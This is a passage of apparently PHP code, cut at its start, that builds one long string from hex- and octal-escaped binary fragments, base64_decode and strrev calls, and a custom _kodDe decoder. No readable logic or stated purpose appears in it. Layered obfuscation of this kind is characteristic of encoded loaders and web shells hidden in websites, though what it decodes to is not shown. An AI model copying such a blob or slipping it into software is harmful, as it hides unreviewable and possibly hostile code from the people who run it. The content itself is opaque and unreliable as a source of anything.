w==')."\7\233\47\16\154\274\347\263\47\177\171\366\342\377\374\355\275\347\137\337\172\374\342\373\277\370\363\163\346\345\17\336\75\361\257\177\276\166\323\213\352\345\17\176\361\342\77\276\341".base64_decode('9y361ys7n1jx0xO/eP6Uy+7e1rHurU9PbFZGT/jep5d+77XMw49OeXaK79kDrt7v9Q==').base64_decode('t9bscUaq/PSpf4x/r/kPe+49LfrQxiuHX5u3ZMkR37igb9+5N7T9u2/ez+/Uj4rcPA==').strrev('Õû`çq[oßÎğ¿?{Ù{zî‡/ë9ß{á{¾‹Ãã}­6óÍÎ±kû®»>÷öÌâó')."\xaf\xf4\x9f\xf0\xaf\x8f\x7e\xf7\xf2\x7b\xff\x3e\x7e\xcb\x8a\xfa\x9f\xfd\x77\xf8\xf6\xf7\x33\x97\x7f\x60\x1c\x75\xe8\x79\x3f\x98\xf6\xee\x63\xd3\xf\xdd\x6b\xc1\x63\x87\x8c\xef\x7c\x3a\xb1\xec\x98"."\163\166\376\267\142\237\173\375\215\67\374\344\326\232\13\177\374\374\231\167\356\170\167\117\353\52\377\232\237\364\174\347\344\53\223\332\214\253\36\176\124\177\144\316\264\47\157\174\371"."\322\255\207\76\167\371\137\357\271\370\351\253\7\32\356\31\175\340\334\375\77\330\163\351\234\65\127\64\174\262\317\251\157\175\360\300\316\347\77\310\334\233\335\370\257\165\73\176\335"."\265\370\245\113\276\151\14\16\234\160\324\125\73\146\374\257\267\167\237\266\375\366\113\216\177\344\210\110\251\370\140\142\375\312\303\336\377\156\274\120\56\277\372\361\202\235\117\171\266"."\275\366\362\202\127\176\373\312\251\217\247\37\174\146\372\350\232\103\143\301\323\17\235\130\267\370\322\333\153\237\373\303\325\367\306\77\30\316\337\271\74\320\60\373\127\227\216\374\257"."\362\67\27\14\154\52\57\370\342\262\47\57\35\276\151\306\143\307\166\315\332\363\47\123\257\273\375\357\55\77\176\362\233\257\34\171\343\151\357\137\362\304\276\57\264\57\173\41\172"."\355\51\377\375\126\355\334\225\7\150\7\357\165\112\363\372\167\246\134\366\265\150\355\105\113\365\307\312\177\137\75\370\311\341\313\152\37\53\377\372\271\243\306\222\207\337\366\175\377"."\x7\x7\xaf\xd9\xbf\x65\x6a\xe7\xaf\x8e\xbe\xb5\x59\x3f\xff\xdb\xc5\x3d\xce\xd8\xa7\x79\xd3\x27\x9f\xdd\x1c\x3c\xf2\xb3\xef\x9c\xd1\x79\xd8\x67\x1f\x2d\xbf\xff\xcc\x1b\x8e\xfd\xf1\x5d\x73\x5f\xd5"."\x6e\xba\x6e\xc9\xd4\x97\x8e\x3f\xe5\x80\xaf\xff\x6d\xde\x8d\xc9\xdf\xee\x91\xaf\xff\xde\x48\x3c\xf3\xa4\xe7\xba\xb7\x9f\x78\x63\xce\xca\xcf\xf\xbd\xea\xd6\x3f\x26\xf\xfc\xf6\xc0\x5\x13\x9f\xb5"."\116\275\174\316\340\155\177\276\63\22\177\367\224\107\106\236\10\134\264\337\71\243\33\216\72\145\354\335\336\276\246\115\267\57\277\351\57\33\127\336\162\340\341\237\254\123\117\250\173".base64_decode('5JLsxBvbQ5Gev1/wrnLood8K/GyfKW/sMetTj//JP/60+wePaZuuuWl5w/snnHbTDQ==')."\x1b\xa6\xae\x7a\x6d\xfb\x1\x4d\xb7\x6d\xdc\xba\xdf\xca\x33\xce\x3a\xfb\xc7\xfa\x9c\x5a\xcd\xf7\xcb\xe3\x3d\x4b\x8f\xbb\x71\x59\xd3\x9c\xbd\x37\x9c\x75\xc2\x8b\x9b\xdb\xd3\x5b\x17\xad\xbf\x75\xd3"."\374\77\77\375\146\360\165\363\255\253\256\372\340\117\247\236\323\267\307\374\341\267\62\346\326\337\137\176\245\161\320\360\363\313\163\157\256\271\352\127\217\257\371\375\325\277\324\136\35".strrev('Oàèõ¼mÈt^vµv¯ûkº^Àå¶ZıïÏå¥¹oäfÆ£	ÿZñŸ'."\r".'\'%Ãÿo-').strrev('Ï‹ú…®ÀìülûéÅÛægğå¿±ÕÿßÚÿ»½ó³ùvG´ÜGs¿Év{ìO')."\217\217\76\66\32\334\162\301\332\334\364\336\253\157\376\354\340\47\356\371\135\240\351\336\15\257\25\152\56\174\374\236\302\77\276\270\342\340\35\17\334\367\331\277\206\126\250\137\374"."\363\213\107\266\76\365\237\117\357\375\370\374\105\17\174\261\373\17\217\135\361\357\177\75\171\166\364\251\53\326\37\364\223\77\335\164\335\16\377\177\76\56\175\370\371\47\252\117\275"."\xff\xbe\x2f\xde\x3e\xf5\xe3\xd7\xff\xfd\xa7\x2f\xde\x3a\xd0\xff\xe0\x3f\x7f\xf3\xfc\x3b\x57\xfc\xfb\x3f\xf\x5e\xf1\xd1\xc3\x9e\xf7\x3e\x5a\x7b\xf3\x91\xef\xb6\xae\xde\xbe\xea\xba\x5d\xcf\x5c\xb9".base64_decode('67WX7vlozhVrP2/508cfFK857pU/bPnrB3MP+NmW8nWv/PmIHx7++okffms/++s/ew==')."\xe4\x47\xa5\xa6\xf6\xbb\x4e\x7d\x6d\xdf\x8f\xae\x3f\xb1\xf9\xe7\x4f\xee\x68\xfa\xc3\x27\xfd\xf\x14\x46\x93\xbf\xbc\xf8\xe5\x7f\xde\x76\x6b\xe2\xd5\xb\x3b\x7f\xf1\xc5\xcc\x8d\x4f\x7f\x77\xec\xa2".base64_decode('I077aOXMVbdm7jrLv/nxh35828iVm361XXv6zDW37HnqR9u+MffqO+/4DrOIGrYG9Q==')."\xf2\x10\xf0\x9a\x5a\x39\x37\x98\xb6\x41\x66\x7\x1a\x4d\xb3\x9b\xc0\xaa\x63\x7e\x3\x33\xef\xd0\xf3\x63\xd9\x61\x60\xbf\xe6\xcd\x1\x68\xba\x64\xd8\xe3\x59\xb8\x11\x6\x58\xa9\x3c\xa1\x5b\x45\xb8"."\xb8\x6a\x9a\xb\xdc\x56\x3a\x63\x98\x25\x76\x76\x9b\x3b\x13\xa0\x63\x96\x99\xca\x6b\x13\x50\x7e\x26\xe8\xc\xcd\x85\xdf\x99\xec\x33\xe5\x91\xe1\xec\x9a\x2\x48\x4a\x4b\x23\x99\xf1\xc2\x4\x48\x55"."\xe6\xb2\x86\x36\xce\x9d\xf\x6d\x9b\xd\x7d\xc8\x8c\x8c\xda\xa9\x24\xb0\xd6\xb3\x1b\x80\xf9\xd3\xd7\x64\x46\xc6\x4b\xd0\xdb\x26\xf8\xd0\x48\xb9\x34\x6c\x17\xa0\xc9\x23\x7a\xd6\x4c\x33\x25\xea\xb1"."\344\32\335\30\7\101\136\306\114\116\14\226\201\255\36\106\347\224\11\46\54\312\146\64\174\126\201\246\314\201\336\315\141\1\326\266\131\254\337\63\33\101\121\52\223\107\174\154\11"."\xbe\xc\x4d\x1c\x4a\x4d\xd8\xb9\x61\x38\x12\x35\xcd\x1\xe8\x5c\xa6\x6d\x36\x6b\x3e\xd4\x96\xc9\x9a\xa9\x35\x69\x68\x5b\x6a\xa8\x9c\x35\x46\xe1\x2c\x59\x1e\x5b\x53\xca\xa7\x41\x60\x37\x73\x1e\xa8"."\x77\x8e\xd\x8f\x67\xb\xec\xaa\x7c\xb8\x9c\x1c\xcb\x8f\x40\x5f\x26\x6\x47\xad\x4c\x9\xc6\x77\xf6\xbc\xb9\x6c\x22\xc7\x92\x16\xb3\x1f\x98\x33\x17\x6a\xc9\x14\x26\xec\x12\x3b\x3\xcd\x66\x33\x34"."\250\147\46\106\12\60\51\243\145\253\144\347\140\4\33\347\101\273\327\150\143\43\105\235\151\37\240\71\314\163\365\324\234\135\52\216\302\31\161\136\3\164\57\131\116\147\55\246\175"."\x37\x52\x28\x96\x32\xec\x86\xa7\x89\x8d\x40\x6a\x62\xcd\xe0\x30\x13\x37\xcf\x7\xf5\x80\xc6\xf9\x30\xab\x73\xe6\xc3\x68\xf\x8d\x4f\x14\xb3\x83\xc3\xc\x3f\x60\x40\x67\xce\x82\x39\x98\xd7\x8\x2d".strrev(';øèìêí˜²R‰ñÚÃo&f/•¼¤flÅ¾DÄ19)fR`òlÃ#S–L')."\5\205\315\354\170\51\67\4\205\107\107\12\245\334\4\114\130\161\144\130\237\30\3\141\363\360\32\73\155\225\240\257\263\147\302\270\147\313\143\51\215\251\126\24\223\143\23\166\6"."\12\353\203\331\65\71\46\216\233\325\4\303\60\207\115\343\314\131\120\103\336\114\257\111\216\100\241\302\260\236\34\51\263\321\65\355\264\156\15\261\32\140\224\233\140\130\206\223\143".base64_decode('Q9mcwbBpFsOZUnKcqe+UjbGhkVFW21jWsFOwMubMhvY0zYb2lHWEhGlAtrw9XNDHYA==')."\260\146\66\301\247\47\322\251\361\62\123\224\234\110\226\307\271\162\104\326\326\362\71\275\300\226\25\344\37\117\332\153\62\271\21\206\223\163\330\122\317\345\65\146\270\243\227\207\215"._kodDe('Ky+EW67Ax3vlGcBkrRYRQyorowBbmYJ+1OyWIVVdvsaMTPMUf0+mNVesoT9fwNkxdZk=')."\47\206\113\343\32\40\146\251\130\310\246\331\264\163\175\322\126\55\71\314\344\272\262\122\46\263\213\63\362\276\234\226\347\272\60\235\60\376\111\331\54\102\316\60\254\263\141\141\112".base64_decode('A7ZQtgAlUIAbOV3IpelNACspTuBY/CGpa+BoXK4lmbelZBRzpMZts8gVRKjqmQ+30A==')."\x27\x77\x75\x55\x8e\xd1\xb4\x2a\xf7\x8b\x20\x8b\xb5\xac\x51\xb3\x8\x43\x36\x6c\xa6\x92\x59\x93\xad\xc\xa8\x35\x35\xe8\xa8\x93\x43\x99\xc8\xc0\x9d\x92\x9e\x4\x8e\xea\x71\x68\x77\x33\x98\x63\xb0"."\x6\xc9\xa4\xa9\x72\xc4\xc7\x86\x7b\x50\x9a\x50\x2a\x2c\xb7\x35\x6b\xd8\x27\x83\xbd\x72\xaa\x91\x47\xad\xc8\x66\x7d\x4e\xb3\x5e\x95\xfc\x81\x31\xa0\xa6\xa3\x16\x56\x3a\xce\x8b\xdb\x68\x6b\x58\x1a"."\170\154\217\333\333\243\46\2\361\245\222\176\36\266\27\145\350\244\12\135\153\251\133\242\6\151\34\345\31\164\16\1\303\220\335\133\357\335\171\376\105\273\56\274\165\327\271\267\354"."\274\147\323\356\133\156\335\171\377\205\50\372\366\335\347\355\274\345\362\167\57\331\360\366\335\347\276\175\367\111\273\117\277\343\257\367\235\263\363\374\255\273\117\275\177\347\145\327\357".base64_decode('vPr0t++9f/eDp79z/dlv371l12Vn7txw19v3XrTzjCt3nn7+rk3nvn3/ZSj/rjNEzQ==')."\50\333\316\55\27\343\262\367\235\262\363\356\273\167\157\276\236\247\376\365\276\223\201\62\300\162\356\320\155\154\146\313\224\256\310\350\50\213\24\100\110\335\362\51\75\131\35\215\260"."\102\364\302\261\206\226\235\321\213\212\115\64\265\64\364\67\157\346\275\24\341\250\11\263\245\30\171\234\254\260\271\361\161\244\114\350\271\2\106\55\30\45\77\65\152\164\230\14\110"."\370\127\155\230\151\102\25\264\302\143\55\346\252\16\7\341\172\15\113\364\224\264\206\0\251\146\45\215\212\51\314\360\110\261\115\26\316\215\363\111\167\55\202\252\323\312\233\301\246"."\166\210\13\326\205\274\27\32\46\331\202\320\73\223\12\224\42\253\312\111\22\34\353\315\111\114\344\44\347\110\200\100\226\50\6\170\24\332\24\217\102\256\203\25\247\5\57\276\350"."\147\227\347\362\32\223\233\137\324\13\131\176\373\203\145\232\125\7\121\156\215\174\27\355\352\132\274\312\60\362\316\71\22\321\272\56\331\125\62\312\243\55\13\200\15\63\230\105\204"."\x4e\xdc\x52\x92\xab\x7a\xd1\xd\x1a\x15\x82\x67\xf4\x21\x4e\x27\x8b\x7a\xca\x60\x9a\xc5\x7a\x8e\xe4\x4\xfa\xe8\x93\xae\x7d\xa8\xd9\xf\x57\x6f\x4e\xa2\xe5\x50\x74\xdc\x60\x2d\x5c\x5c\xc8\x14\xb0".base64_decode('dwR7wWKwuWbGW1IbICzMmGRo1n0rxhdPW6vkowBna/Z6vZI0V+iT4RBUJ+6EESyEVw==')."\366\144\360\66\256\104\201\226\374\320\220\156\331\315\304\14\122\231\241\240\206\316\363\65\242\0\131\34\263\175\163\121\220\214\30\54\350\176\266\105\133\314\66\147\232\157\26\354\365"."\xd6\x2\xd0\x0\x59\x40\xe8\x4a\x8b\xd4\x7c\x80\x8b\x52\xa5\x7c\x96\x41\x51\x10\x65\x89\x95\xf2\x78\xb6\x9b\x9d\x7d\xd6\xf3\x29\xa9\xd0\x2\x2d\x69\x4b\xb5\xaa\x69\x18\x54\x9f\x18\xf\x6d\x86\x48"."\327\123\140\240\346\227\106\151\24\62\260\262\135\116\34\100\375\367\162\264\100\323\213\130\207\224\105\264\122\141\367\201\52\55\311\210\74\46\60\12\27\47\303\365\45\105\155\171\312"."\xb\x88\x3d\xc9\x73\x75\x54\x2b\xab\xb1\xdb\x46\xb\x5b\x77\xe4\x75\x8e\x7f\x25\x8b\x5f\x88\x60\xd5\x6d\x15\xed\xeb\x96\xc0\x55\x35\x65\x40\x62\x24\xdc\xaa\xb6\x85\x63\x62\xd9\xab\x85\x92\xdb\x54"."\110\366\343\21\350\11\253\361\170\124\62\34\42\6\251\53\325\245\321\66\65\30\215\56\15\3\32\302\300\67\113\124\23\333\362\211\333\144\34\23\66\175\370\152\106\126\54\223\331"."\x12\xec\x68\x1\x6f\xbd\x71\x5\xd4\x31\x11\xbe\x7\x3b\x3\x31\xae\xfe\x3e\xdb\xd7\xe0\x6b\x14\x79\xd1\x7\x55\x6c\x5\xd0\xc2\x4c\xb8\xe3\x89\x40\xac\x8a\xbb\xd\xea\x86\x3\x26\x5\x5c\x6f\x40".strrev('yÄ¯Ø”Û\\Ve;¸JC	Ô>¨dÊ3™’ÉDéJï'."\n".'	—©Çuvô%'."\n".'èÎ').base64_decode('nA1B0dK5sw0oTyOyjY1cI68J0LjPU9tf0z+9v66/frWv3xrwS/uYIU8PRHraoHvNPA==')."\224\262\140\1\167\305\343\313\300\24\60\32\13\4\43\254\51\255\201\70\4\243\301\60\15\274\363\223\333\336\276\347\274\167\56\275\145\347\231\347\242\212\166\375\354\224\135\77\275"."\13\261\55\230\125\271\345\234\167\36\70\157\327\117\266\356\72\7\130\14\145\367\326\155\157\337\377\340\73\77\271\176\347\55\27\357\272\350\127\357\374\354\64\232\360\356\15\267\355"."\x3c\xeb\x7a\xde\x30\xe5\xdd\x4d\xf\xec\x3a\xef\x1a\xce\xbe\x50\xae\xc5\x83\x4a\xbf\xbb\xe1\xdc\x77\xee\xbf\x5\x33\x2f\x57\x9d\xb4\xeb\xce\xb3\x77\x5d\x76\xee\xce\xb3\x36\xef\xbc\xe4\xfa\x77\xce"."\xdb\xba\xf3\x17\xa7\xee\xdc\x78\xee\xee\xad\x17\x1e\xe9\x46\x24\x1a\xef\x63\x53\x1\x76\xc5\xfe\xe3\xb1\x19\x35\x1d\xde\x7e\x6b\x6\x1e\xda\x7a\xf4\x5b\x87\x8d\x22\xd0\x2f\xd3\xed\x26\x5a\xbf\xcb"."\172\103\335\301\220\333\310\110\216\202\247\222\351\24\103\250\146\13\160\232\26\170\72\141\161\342\336\240\245\166\322\126\254\203\371\227\32\45\65\246\55\24\17\306\302\255\41\120\273".base64_decode('5xM1jfBaoPCAoPHYch7m1pwVnmWUOobM9YqjI5ovaWZLuTxprFKDVa5qPHgPIhZPSg==')."\xd\xde\x4f\x11\x40\x4f\xa2\xa5\x57\x87\x9d\x4f\x10\x75\xdd\xda\x55\xb5\x9e\x6\x4f\x63\xbd\x2\x6e\x67\x68\x9\x70\x36\xa3\xd4\x80\xe\x38\x2f\xe7\xf8\x88\x67\xd0\x11\x6b\xf4\x34\xd4\x2b\x35\x85"."\341\32\150\227\30\127\324\172\225\346\264\24\315\123\7\15\226\233\53\362\42\152\146\331\105\315\100\344\115\111\172\70\210\227\107\277\16\7\62\111\237\50\101\347\11\345\160\303\224"."\x40\x77\x9b\x33\x27\xf5\x3b\xd3\x53\x4b\xb4\x25\x93\x3e\x9b\x7b\xb1\x60\xd3\x5c\x5b\xaf\xc\x82\x31\x43\x95\x44\x52\xcc\x31\x18\x2d\x8e\xc1\xa8\x9b\x1\x74\xa2\xa7\x83\xcf\x37\xb5\x54\x50\xa8\x21"."\33\155\226\146\261\211\2\50\231\52\14\245\263\305\362\232\250\33\150\162\150\176\24\340\51\130\247\237\327\204\310\21\117\140\63\210\341\174\22\253\244\21\207\100\65\224\37\244\375".base64_decode('zFlDjNSBmXjXKt4HhssKY0a4OyFskhdKBDsplsclNE8NTnMgqhhOxYEi/FAB+ehywQ==').strrev('Ú¥u¢¯K!±“ğÇZ £å1jQiKNcó@˜§ğÔ3°x´SQuİÜ/’_a')."\x88\x6d\xa2\xa3\x50\x18\x82\xc6\xc0\xec\x2b\xc4\xde\x5d\x23\x45\x5a\x6a\xa9\xc3\xe\xa8\x92\xfb\xbd\x8a\xc6\x12\x2a\x1a\x0\x20\xcf\x12\xd5\xad\x95\x76\xb\x49\xb5\x1b\x5b\x54\x95\xd9\x69\x20\x8d"."\370\40\223\311\31\123\203\314\75\26\252\34\327\31\214\166\267\207\231\325\135\33\234\265\13\114\274\4\231\332\142\141\354\356\1\276\257\260\252\44\133\107\24\21\352\25\50\122\140"."\322\52\24\26\106\374\70\201\357\371\50\42\266\174\24\341\233\15\316\45\371\361\302\337\217\167\363\260\140\165\121\244\67\316\154\56\60\365\135\321\306\303\235\334\144\33\47\104\143"."\x52\x24\x10\xb\x74\xc5\x79\x34\xb6\x82\xdb\x70\x70\x18\xb5\xe5\x50\xbb\x7b\xbb\x4\xc5\x8f\x4\x96\x23\x64\x89\xa\x6\x85\x51\xeb\x3a\xdf\xf4\xc5\xf5\xfd\xd4\x30\x8e\x6\xe9\xcf\x12\x16\xc3\xc6".base64_decode('QgNrGz3KnPX1kId7brAzRp7xmvgryyJqJNpB48S/WCifEicTpU9BjG9CML4W27r4ag==')."\x50\x10\xe\x2b\xd4\xda\x56\xe9\x8e\xae\x8\x8\x97\x55\x52\x2\x40\x84\x7\x2b\xff\xf1\x7d\xfd\xa3\xfd\x3e\xc4\x2c\x58\xab\x85\xa1\x5b\x5b\xab\xc2\xd8\x90\x20\x39\xd9\x53\x1\x0\x94\xe\xb0\x6d".base64_decode('dLUHdgw1aw4xZzOIIDJ2gf6uZAFCK6EAOu4WsszijZraqf3r+o/p9/qodSFmXvo9og==').strrev('7ô!u‰¿£uÖËC2|-EÑ'."\n".'{½œÂF–«¢—¨íA0|J¤i‡qãcÚ%hjI')."\202\176\42\11\64\135\6\317\200\226\144\44\274\64\264\16\377\43\22\352\371\100\122\123\42\147\201\160\367\72\364\57\42\60\353\302\335\356\312\132\103\211\25\241\20\315\300\302\360".base64_decode('K7IiggNdlfzPYU1+SBaa/VC1qtaRwfQOzKhXVb/VC/jCvVvU1R7dWAt7SCAeFNTXgQ==').base64_decode('EJW4QPTunYjAvapBvCMW7e2R4p2B5eHuDhbzT2eh6VC10haOoyEKMmQUzt7kODCchA==')._kodDe('LYMeT6o7+BKof7sDE3+89AAjhUgsXEopYBfDdEx91JKhmwFs/yW7KccYB9Jncx2NeHY=')."\11\272\261\10\31\3\26\241\3\300\142\144\270\130\204\70\225\143\21\322\121\26\301\247\223\120\67\113\103\147\104\164\276\143\7\277\214\126\346\22\373\5\251\101\311\365\5\246\301"."\x3e\x2a\x33\xc3\xe\x50\xd0\x29\x4e\xe3\x92\x4d\x97\x58\x94\x48\xa8\xa4\x83\x3f\x55\xc5\x53\x24\xab\x6a\x3f\x5\x21\x6e\x93\x0\xd1\x6f\xff\xea\xc5\x84\x1b\x5e\xcd\x10\x93\x9a\xee\xda\x9\xc3\xce"."\72\276\2\206\176\350\53\141\142\127\51\175\207\331\76\20\171\240\152\112\62\151\262\121\313\0\41\201\242\2\154\20\366\12\101\16\126\101\44\142\140\32\165\36\241\70\135\132\315"."\x4f\x46\xe0\x8e\xc3\x3\xbf\xd0\xa2\xfd\xe9\x4f\x3f\x44\x99\xd0\x2\xec\x59\x6a\x3d\xb0\xc9\x32\x1b\x8\xe7\xe9\xb8\xbf\xbf\x66\xb2\xd1\x82\xc\x6c\xcc\x20\x5a\x43\xa3\xac\x94\xc1\xf7\xbc\x64\x6"."\xbb\x50\x51\xed\x1c\x13\x80\x93\xc3\x99\x10\x35\x53\x71\xb5\x88\xb7\xc5\xa2\x3d\x94\x3\x51\xc2\xed\xa\x75\x90\xa0\xd4\x52\x1\x77\x2d\xb0\x56\xc1\x58\x8\xaf\xe\x9a\x8b\xa5\xd5\xd5\x3a\xc4\x51"."\x8b\x6a\x15\xb0\x96\xae\x77\x96\xa\x77\xb7\x85\x56\x2a\xb5\x46\x6a\x4c\xd5\x34\x15\xa\x2b\x68\x2d\xb2\x8a\x94\x8a\x9a\x58\xd\xb4\xad\x70\x79\x69\x65\xcc\x51\x45\x46\x2f\x76\x5e\xe\x52\x58\x42"."\xa0\x5c\x5\x6b\x46\x5c\x1d\x30\xcb\x54\xf\x1c\xca\x79\xa\xe5\x88\x69\x52\x38\x8e\x36\xec\x48\x84\xf4\x14\x25\x19\x16\x66\x64\x3d\xa\xf7\x48\x80\x81\xf8\xf0\x41\x45\x9e\x50\x11\x4b\xa0\x15\xd1".base64_decode('pNDKRCyAgYT7nLov+kMICj4dFXMaNdMkPJtvNQgJVjtYRMo8YiYRMIhseVKfeAqRFA==')."\320\141\226\345\10\113\201\353\246\261\236\130\270\53\20\133\5\103\46\316\0\260\2\315\254\303\150\127\104\14\253\127\62\33\357\106\255\226\315\310\351\34\163\12\213\316\263\214\302"."\242\326\300\2\300\63\17\14\17\365\1\252\162\253\140\46\104\251\143\66\266\36\26\140\336\31\210\245\22\223\124\345\20\311\341\61\61\153\200\373\60\53\162\252\154\153\45\234\224"."\342\115\22\117\62\243\366\355\201\336\210\14\201\241\122\226\206\126\175\311\32\141\55\255\266\106\130\32\23\307\360\325\6\375\251\233\15\375\243\16\43\352\232\320\231\264\224\307\36"."\x51\xb8\x43\x44\x68\x15\xec\xad\xbd\x89\xa8\x8a\xf6\x8f\x58\x8\x53\x73\xe8\x11\x1f\x56\xa9\xbd\xd2\xb9\x5b\x9e\x14\xa8\x6\x67\xe0\x1e\x5f\xbf\xa4\x6b\x2c\x4f\xb5\xae\xf1\xf2\x5c\xf2\x14\xea\xee".base64_decode('CHeHWrrGw/FAl8IaDrI17AZxHtQTjqoRxBOrsvgsHAUhr8OpnqoKpyM+Tahl28WS5A==')."\157\315\60\211\12\164\27\267\226\40\72\333\10\41\2\302\331\0\27\104\223\264\322\40\56\55\157\127\120\336\345\312\322\60\233\161\12\316\114\271\224\5\42\273\352\370\270\133\347"."\131\6\13\165\154\161\217\313\356\215\271\233\66\50\320\53\71\13\300\205\25\366\101\162\223\223\167\66\17\355\227\131\346\345\110\325\105\157\162\272\145\361\373\134\162\370\141\101\73"."\43\174\45\310\236\104\333\132\331\310\225\362\166\134\147\12\21\155\203\104\231\135\130\232\11\153\36\111\311\235\134\216\210\351\240\116\335\134\5\241\246\60\357\257\224\113\0\43\302".strrev(''."\n".'8‚æH/¥{'."\0".'Ú —]<+÷¬À\\ƒ9‹ÑìŞdo­÷6vÁ„äè¼#°u‹¾(u')."\x13\x89\x6f\x18\x25\x8b\x8c\x52\x1e\xb5\xcb\x2b\xdb\xf8\xa0\x89\x25\x40\xc9\xaa\x80\x79\xb2\xa3\xb1\xb9\xa0\x51\x85\x90\x7\x2\x43\x0\x61\xbf\x45\x96\xe2\x13\xbe\x60\x48\x9d\x98\x77\xf1\xa\xdf"."\xc\x29\x4d\xb6\xa7\x94\x5c\x68\x1f\x29\xcf\x38\x99\x3a\x81\x78\x69\x43\x76\xd4\xe0\x13\x5e\x54\x39\x2e\x2f\xe1\x3\x8e\xed\x8c\xe1\x5a\x1c\xf3\xc1\x69\x55\x6a\x4b\xf\xcf\x9f\xe4\xe\xb4\xe9\x68"."\110\303\114\0\64\110\126\237\322\54\32\321\211\132\152\26\307\45\34\220\240\135\314\175\21\370\160\215\230\103\234\160\40\366\20\34\127\71\210\107\70\12\145\175\72\266\61\242\26"."\x1f\xd8\x22\x8c\x17\xa4\xe\xd2\xbe\xba\x50\xaf\xe4\xc6\x76\x92\xf5\x5e\xb5\x5c\x10\x32\xf2\xf\x16\x89\x2c\xe7\xab\x3f\x18\xd3\xc5\x96\x8c\x8a\x11\x93\xae\xaf\x2c\x24\xe8\x1f\xf9\x12\x29\x24\xd1"."\x4c\x57\x19\x82\x8e\xd4\xfc\x4\x66\x3e\x3\xc9\x2\xc7\x10\xa1\xee\x8e\xaa\x9d\x68\x2f\x88\x32\x8e\xc1\xb0\x12\xe\xda\xcb\x4a\x1\x29\xb0\x11\x43\x93\xf4\x13\x9b\x58\x38\x8f\x2d\x20\xd7\xf8\xf4"."\2\21\46\173\55\42\253\74\304\324\47\300\33\226\330\251\3\364\147\125\56\345\105\15\7\254\113\351\66\367\102\204\251\31\263\37\304\155\226\354\213\163\234\372\215\112\136\67\265"."\262\216\55\270\230\264\243\102\213\5\272\122\331\71\150\42\276\225\212\107\173\143\354\352\4\307\261\310\110\215\205\202\253\370\55\6\207\266\7\226\273\41\141\54\362\13\164\124\5"."\x73\x41\x14\x86\x93\x13\x9f\x1a\x8b\x62\x89\x5d\x28\xd2\xee\x2a\x10\xef\xe4\x5e\x52\x9d\x30\x35\x12\xee\x5e\x5a\x35\x1\xf1\xd\x5d\x52\x11\xa\xc\x27\x42\x5d\x6e\x98\xb3\x86\x78\x28\x10\x63\x1e"."\170\161\274\65\22\15\112\311\341\150\345\110\160\306\204\3\251\274\217\2\375\307\327\365\257\45\107\226\146\164\162\111\255\303\202\1\257\72\60\243\176\161\377\372\372\272\176\377\142".base64_decode('33Quz6LkSrJSnQRssU2k2Q3A+w8D0mIQ8/t88BEe8Pf7masrv0iEX5Gfbx7g+TpOHQ==')."\6\71\132\350\362\247\301\114\325\175\156\373\52\225\31\125\61\222\252\245\331\375\174\230\336\212\252\361\125\161\76\111\116\230\3\25\51\62\313\152\12\256\314\350\157\217\234\25\153"."\306\124\315\350\300\145\207\131\260\14\362\31\246\130\46\142\75\247\314\144\11\273\50\22\223\43\214\210\21\310\347\250\2\121\362\141\161\370\206\345\30\147\313\66\217\66\111\330\205".base64_decode('g4iX7OgMH7s00tUd7VkWiyd6l69YuQr8NDYzbEkrXuZhDHyj+sta0V9mXs+X46OAbg==')."\xf9\x65\x16\x8b\x3\x51\x1f\xb1\xdb\x59\xe6\x35\x8c\x4a\x8\x78\x2a\x26\x1b\xfe\xea\x49\xb4\x36\x7f\x2e\x6f\x37\x4e\x92\xa3\xa7\xa8\xf\x9a\xa6\x3d\x49\xea\xf2\xae\x2f\xaf\x18\x12\xfb\xfa\xad\x1"."\x8e\x9e\x29\xbd\xc\x41\xa1\x8a\x66\x89\x3\x10\x70\x17\x5e\xd9\xfb\x3a\xc6\x56\x99\xe1\x4b\xd\xba\xd8\x0\x0\x8\xbf\x9b\x12\xb3\x20\x80\xdc\xf1\x30\x8d\x8e\xb3\x4b\x10\xe2\xd6\x4b\x72\xdc\xeb".base64_decode('s2bCZIN7zQ7sXpO51hwhTh/dHiNHvNqwI1048R3xoqOiI+7yGonVErgnXxyxeExeFA==')."\144\313\340\172\65\170\143\352\164\55\111\16\344\176\47\342\104\373\260\131\231\5\356\312\333\21\213\234\122\372\50\327\13\2\163\314\151\21\217\333\64\352\121\204\163\143\46\352\164"."\x7a\x2d\x66\xab\x82\xf8\x94\x11\xac\x74\x52\xf6\x2d\xc0\x88\x6b\x6e\x58\x28\x70\xe5\x86\xb9\xb2\x45\xd2\xc1\x5c\xe0\x7d\xbc\x5d\xd2\xf3\x12\xfc\x3\x3c\x33\x80\xd2\x5a\xc7\x99\xb2\x14\x58\x61\xb6"."\x8e\xc7\xa4\x77\x53\x1c\x7e\x1d\xe4\x87\x19\xb4\x42\x21\x98\xc1\x7d\x70\x2c\x55\x7\x28\x29\x47\x18\xa9\x4c\x63\x55\x11\x59\xc5\x4\xa4\x79\x54\xdb\xd4\x87\x92\xdb\x28\x33\x97\xe2\xf9\x2d\x11\xe2"."\x13\x98\x96\xa6\xd6\x51\x5d\x8a\x11\x6e\x8b\xad\x8c\xac\x66\xd9\xcb\x1d\xbe\x70\xbe\xd2\xfd\x31\x76\xec\xd0\xc5\x19\x56\xe8\xf1\x98\x97\xb0\x10\xde\x42\xd1\x14\x8a\x62\x4\xe4\x2f\x12\x2f\x5b\x9e"."\x51\xa0\xd3\x1e\xe2\xb4\x51\x6d\x60\x53\xe6\x37\x2d\xcb\x8f\x7d\xfa\x11\xce\x92\xab\x5e\x45\xe3\xec\x7e\xc3\x39\x6\x54\x1b\x46\x3a\x88\x82\x73\x31\xee\xf2\x97\x3b\x4\x16\x5e\x83\xa9\x58\x9a\x86"."\x43\xdc\xe9\x9\x62\x90\x3\x43\xd8\xcf\x85\x99\x67\xef\x76\x84\xc6\xa\xa6\xa5\xcb\xfe\xa8\x53\x3a\x69\x2e\x37\xf9\x96\x3c\x3a\xe7\xb4\x31\xbc\xc8\x98\x76\x9a\xe4\xdb\x19\xb1\x5c\x43\x7c\xf4\x89"."\173\130\331\325\37\36\162\157\316\341\302\177\314\213\6\301\345\61\331\322\365\141\246\115\47\261\315\374\150\334\303\75\41\273\73\206\221\137\254\374\42\167\203\115\357\66\275\125\1"."\136\111\233\216\342\277\344\111\36\67\16\16\315\31\62\66\354\64\115\177\216\253\326\127\157\121\70\244\106\163\111\37\206\130\252\217\63\147\317\56\162\344\362\17\335\337\321\337\325"."\x9f\x90\x7\xc7\x2e\x6a\xe9\x34\x6a\xac\xe4\xf2\xd3\xd1\x16\xe1\x8e\x1a\x70\x8f\xbc\xe5\xc0\x86\x60\x72\x67\xd6\x20\xb8\x3f\xa6\xaa\x2f\xec\x16\x8e